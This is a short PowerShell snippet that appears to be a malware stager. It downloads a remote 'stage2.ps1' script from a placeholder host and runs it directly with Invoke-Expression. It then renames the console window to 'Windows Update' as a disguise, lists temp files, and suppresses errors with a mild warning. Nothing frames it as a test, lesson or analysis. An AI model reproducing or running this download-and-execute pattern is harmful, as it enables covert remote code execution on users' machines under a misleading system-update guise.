
try { $PayloadUrl = "https://example.com/stage2.ps1"; $PayloadText = (New-Object System.Net.WebClient).DownloadString($PayloadUrl); IEX $PayloadText; $Host.UI.RawUI.WindowTitle = "Windows Update"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Remote fetch failed" }
